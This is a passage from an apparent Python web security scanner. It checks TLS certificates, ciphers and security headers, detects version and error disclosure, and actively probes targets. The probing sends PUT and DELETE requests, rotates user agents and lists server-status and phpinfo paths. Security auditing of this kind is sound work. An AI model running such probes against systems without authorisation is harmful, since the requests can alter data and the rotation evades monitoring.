                analysis['days_until_expiry'] = (expiry_date - datetime.now()).days
                
                # Check for expiration warnings
                if analysis['days_until_expiry'] < 30:
                    severity = "HIGH" if analysis['days_until_expiry'] < 7 else "MEDIUM"
                    self.log_vulnerability("SSL Certificate", "Certificate Expiration", severity,
                                         f"Certificate expires in {analysis['days_until_expiry']} days",
                                         f"Expires: {not_after}",
                                         "Renew SSL certificate before expiration",
                                         "", "A6:2017-Security Misconfiguration")
            
            # Subject Alternative Names
            san_list = []
            for ext in cert.get('extensions', []):
                if 'subjectAltName' in str(ext):
                    san_list = [item.strip() for item in str(ext).split(',')]
                    break
            analysis['subject_alt_names'] = san_list
            
            # Check for weak signature algorithm
            sig_algorithm = cert.get('signatureAlgorithm', '').lower()
            if 'sha1' in sig_algorithm or 'md5' in sig_algorithm:
                self.log_vulnerability("SSL Certificate", "Weak Signature Algorithm", "MEDIUM",
                                     f"Certificate uses weak signature algorithm: {sig_algorithm}",
                                     f"Algorithm: {sig_algorithm}",
                                     "Use SHA-256 or stronger signature algorithm",
                                     "", "A6:2017-Security Misconfiguration")
            
            analysis['signature_algorithm'] = sig_algorithm
            
        except Exception as e:
            analysis['error'] = str(e)
        
        return analysis
    
    def check_certificate_chain(self, hostname, port):
        """Check certificate chain for issues"""
        issues = []
        
        try:
            # Test with verification enabled
            context = ssl.create_default_context()
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    peer_cert_chain = ssock.getpeercert_chain()
                    if peer_cert_chain and len(peer_cert_chain) < 2:
                        issues.append("Incomplete certificate chain")
        except ssl.SSLError as e:
            if "certificate verify failed" in str(e):
                issues.append("Certificate verification failed")
            issues.append(f"SSL Error: {str(e)}")
        except Exception as e:
            issues.append(f"Chain validation error: {str(e)}")
        
        return issues
    
    def check_weak_ciphers(self, cipher):
        """Check for weak cipher suites"""
        weak_ciphers = []
        
        if cipher:
            cipher_name = cipher[0].upper()
            
            # Weak cipher patterns
            weak_patterns = [
                'RC4', 'DES', '3DES', 'MD5', 'SHA1', 'NULL', 'EXPORT',
                'ADH', 'AECDH', 'LOW', 'MEDIUM'
            ]
            
            for pattern in weak_patterns:
                if pattern in cipher_name:
                    weak_ciphers.append(pattern)
                    self.log_vulnerability("SSL Configuration", "Weak Cipher Suite", "MEDIUM",
                                         f"Weak cipher suite detected: {cipher_name}",
                                         f"Cipher: {cipher_name}",
                                         "Disable weak cipher suites and use strong encryption")
        
        return weak_ciphers
    
    def comprehensive_security_headers(self):
        """Comprehensive security headers analysis"""
        print(f"{Fore.CYAN}🛡️  Comprehensive security headers analysis...{Style.RESET_ALL}")
        
        try:
            self.rotate_user_agent()
            response = self.session.get(self.target_url, timeout=15, verify=False)
            headers = {k.lower(): v for k, v in response.headers.items()}
            
            # Extended security headers check
            security_headers = {
                'strict-transport-security': {
                    'description': 'HTTP Strict Transport Security',
                    'severity': 'HIGH',
                    'recommendation': 'Implement HSTS with max-age >= 31536000',
                    'owasp': 'A6:2017-Security Misconfiguration'
                },
                'content-security-policy': {
                    'description': 'Content Security Policy',
                    'severity': 'HIGH',
                    'recommendation': 'Implement strict CSP to prevent XSS and injection attacks',
                    'owasp': 'A7:2017-Cross-Site Scripting (XSS)'
                },
                'x-frame-options': {
                    'description': 'Clickjacking protection',
                    'severity': 'MEDIUM',
                    'recommendation': 'Set X-Frame-Options to DENY or SAMEORIGIN',
                    'owasp': 'A6:2017-Security Misconfiguration'
                },
                'x-content-type-options': {
                    'description': 'MIME type sniffing protection',
                    'severity': 'MEDIUM',
                    'recommendation': 'Set X-Content-Type-Options to nosniff',
                    'owasp': 'A6:2017-Security Misconfiguration'
                },
                'x-xss-protection': {
                    'description': 'XSS protection filter',
                    'severity': 'MEDIUM',
                    'recommendation': 'Set X-XSS-Protection to 1; mode=block',
                    'owasp': 'A7:2017-Cross-Site Scripting (XSS)'
                },
                'referrer-policy': {
                    'description': 'Referrer information control',
                    'severity': 'LOW',
                    'recommendation': 'Implement strict referrer policy',
                    'owasp': 'A3:2017-Sensitive Data Exposure'
                },
                'permissions-policy': {
                    'description': 'Feature policy control',
                    'severity': 'LOW',
                    'recommendation': 'Implement permissions policy for enhanced security',
                    'owasp': 'A6:2017-Security Misconfiguration'
                },
                'expect-ct': {
                    'description': 'Certificate Transparency',
                    'severity': 'LOW',
                    'recommendation': 'Implement Expect-CT header',
                    'owasp': 'A6:2017-Security Misconfiguration'
                },
                'cross-origin-embedder-policy': {
                    'description': 'Cross-origin isolation',
                    'severity': 'LOW',
                    'recommendation': 'Implement COEP for enhanced security',
                    'owasp': 'A6:2017-Security Misconfiguration'
                },
                'cross-origin-opener-policy': {
                    'description': 'Cross-origin opener policy',
                    'severity': 'LOW',
                    'recommendation': 'Implement COOP for enhanced security',
                    'owasp': 'A6:2017-Security Misconfiguration'
                }
            }
            
            present_headers = {}
            missing_headers = []
            weak_headers = []
            
            for header, info in security_headers.items():
                if header in headers:
                    header_value = headers[header]
                    present_headers[header] = header_value
                    
                    # Analyze header strength
                    weakness = self.analyze_header_strength(header, header_value)
                    if weakness:
                        weak_headers.append({
                            'header': header,
                            'value': header_value,
                            'weakness': weakness
                        })
                        self.log_vulnerability("Security Headers", "Weak Header Configuration", "MEDIUM",
                                             f"Weak {header} configuration: {weakness}",
                                             f"Current value: {header_value}",
                                             info['recommendation'],
                                             "", info['owasp'])
                    
                    print(f"  ✅ {header}: {header_value[:60]}...")
                else:
                    missing_headers.append(header)
                    self.log_vulnerability("Security Headers", "Missing Security Header", info['severity'],
                                         f"Missing {header} header",
                                         f"Header: {header}",
                                         info['recommendation'],
                                         "", info['owasp'])
            
            # Calculate security score
            total_headers = len(security_headers)
            present_count = len(present_headers)
            security_score = (present_count / total_headers) * 100
            
            self.scan_results['infrastructure_analysis']['security_headers'] = {
                'present_headers': present_headers,
                'missing_headers': missing_headers,
                'weak_headers': weak_headers,
                'security_score': round(security_score, 1),
                'total_headers_checked': total_headers
            }
            
            print(f"  📊 Security Headers Score: {security_score:.1f}% ({present_count}/{total_headers})")
            
        except Exception as e:
            self.log_vulnerability("Header Analysis", "Security Headers Analysis", "LOW",
                                 f"Header analysis failed: {str(e)}")
    
    def analyze_header_strength(self, header, value):
        """Analyze security header strength"""
        value_lower = value.lower()
        
        if header == 'strict-transport-security':
            if 'max-age=' not in value_lower:
                return "Missing max-age directive"
            # Extract max-age value
            import re
            max_age_match = re.search(r'max-age=(\d+)', value_lower)
            if max_age_match:
                max_age = int(max_age_match.group(1))
                if max_age < 31536000:  # Less than 1 year
                    return f"max-age too low: {max_age} (recommended: >= 31536000)"
            if 'includesubdomains' not in value_lower:
                return "Missing includeSubDomains directive"
        
        elif header == 'content-security-policy':
            if 'unsafe-inline' in value_lower:
                return "Contains unsafe-inline directive"
            if 'unsafe-eval' in value_lower:
                return "Contains unsafe-eval directive"
            if '*' in value and 'data:' not in value_lower:
                return "Uses wildcard (*) source"
        
        elif header == 'x-frame-options':
            if value_lower not in ['deny', 'sameorigin']:
                return f"Weak value: {value} (recommended: DENY or SAMEORIGIN)"
        
        elif header == 'x-content-type-options':
            if value_lower != 'nosniff':
                return f"Weak value: {value} (recommended: nosniff)"
        
        elif header == 'x-xss-protection':
            if '1; mode=block' not in value_lower:
                return f"Weak value: {value} (recommended: 1; mode=block)"
        
        return None
    
    def server_security_analysis(self):
        """Comprehensive server security analysis"""
        print(f"{Fore.CYAN}🖥️  Server security analysis...{Style.RESET_ALL}")
        
        try:
            self.rotate_user_agent()
            response = self.session.get(self.target_url, timeout=15, verify=False)
            
            server_analysis = {
                'server_banner': self.analyze_server_banner(response),
                'information_disclosure': self.check_information_disclosure(response),
                'http_methods': self.test_http_methods(),
                'server_status_pages': self.check_server_status_pages(),
                'backup_files': self.check_backup_files()
            }
            
            self.scan_results['infrastructure_analysis']['server_analysis'] = server_analysis
            
        except Exception as e:
            self.log_vulnerability("Server Analysis", "Server Security Analysis", "LOW",
                                 f"Server analysis failed: {str(e)}")
    
    def analyze_server_banner(self, response):
        """Analyze server banner for information disclosure"""
        server_header = response.headers.get('Server', '')
        powered_by = response.headers.get('X-Powered-By', '')
        
        analysis = {
            'server': server_header,
            'powered_by': powered_by,
            'version_disclosure': False,
            'detailed_info': []
        }
        
        # Check for version disclosure
        version_patterns = [
            r'\d+\.\d+\.\d+',  # Version numbers
            r'Apache/[\d\.]+',
            r'nginx/[\d\.]+',
            r'Microsoft-IIS/[\d\.]+',
            r'PHP/[\d\.]+',
            r'OpenSSL/[\d\.]+[a-z]?'
        ]
        
        for pattern in version_patterns:
            if re.search(pattern, server_header + powered_by):
                analysis['version_disclosure'] = True
                analysis['detailed_info'].append(f"Version information disclosed in headers")
                
                self.log_vulnerability("Information Disclosure", "Server Version Disclosure", "LOW",
                                     "Server version information disclosed in headers",
                                     f"Server: {server_header}, X-Powered-By: {powered_by}",
                                     "Configure server to hide version information",
                                     "", "A6:2017-Security Misconfiguration")
                break
        
        print(f"  🖥️  Server: {server_header}")
        if powered_by:
            print(f"  ⚡ Powered by: {powered_by}")
        
        return analysis
    
    def check_information_disclosure(self, response):
        """Check for various information disclosure issues"""
        disclosure_issues = []
        headers = response.headers
        content = response.text
        
        # Check for sensitive headers
        sensitive_headers = [
            'X-Debug-Token', 'X-Debug-Token-Link', 'X-Debug-Mode',
            'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version',
            'X-Generator', 'X-Drupal-Cache', 'X-Varnish'
        ]
        
        for header in sensitive_headers:
            if header in headers:
                disclosure_issues.append(f"Sensitive header disclosed: {header}")
                self.log_vulnerability("Information Disclosure", "Sensitive Header Disclosure", "LOW",
                                     f"Sensitive header disclosed: {header}",
                                     f"Value: {headers[header]}",
                                     f"Remove or obfuscate {header} header")
        
        # Check for stack traces and error messages
        error_patterns = [
            r'fatal error', r'warning:', r'notice:', r'parse error',
            r'mysql_', r'ora-\d+', r'microsoft ole db provider',
            r'stack trace', r'exception', r'error in', r'line \d+',
            r'traceback', r'call stack'
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                disclosure_issues.append(f"Error message pattern found: {pattern}")
                self.log_vulnerability("Information Disclosure", "Error Message Disclosure", "MEDIUM",
                                     f"Error messages disclosed in response",
                                     f"Pattern: {pattern}",
                                     "Implement custom error pages and proper error handling",
                                     "", "A6:2017-Security Misconfiguration")
                break
        
        return disclosure_issues
    
    def test_http_methods(self):
        """Test HTTP methods for security issues"""
        print(f"  🔧 Testing HTTP methods...")
        
        methods_to_test = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE', 'CONNECT']
        allowed_methods = []
        dangerous_methods = []
        
        for method in methods_to_test:
            try:
                self.rotate_user_agent()
                response = self.session.request(method, self.target_url, timeout=10, verify=False)
                
                if response.status_code not in [405, 501]:  # Method not allowed, Not implemented
                    allowed_methods.append(method)
                    
                    # Check for dangerous methods
                    if method in ['PUT', 'DELETE', 'PATCH', 'TRACE', 'CONNECT']:
                        dangerous_methods.append(method)
                        severity = "HIGH" if method in ['PUT', 'DELETE'] else "MEDIUM"
                        self.log_vulnerability("HTTP Methods", "Dangerous HTTP Method", severity,
                                             f"Dangerous HTTP method {method} is allowed",
                                             f"Status code: {response.status_code}",
                                             f"Restrict {method} method access or disable if not needed",
                                             "", "A6:2017-Security Misconfiguration")
                
            except Exception:
                pass
        
        print(f"    ✅ Allowed methods: {', '.join(allowed_methods)}")
        if dangerous_methods:
            print(f"    ⚠️  Dangerous methods: {', '.join(dangerous_methods)}")
        
        return {
            'allowed_methods': allowed_methods,
            'dangerous_methods': dangerous_methods
        }
    
    def check_server_status_pages(self):
        """Check for accessible server status pages"""
        status_pages = [
            '/server-status', '/server-info', '/status', '/info',
            '/nginx_status', '/php_info', '/phpinfo.php', '/info.php',
            '/test.php', '/status.php', '/health', '/health-check',
            '/metrics', '/stats', '/statistics', '/monitor'
        ]
        
        accessible_pages = []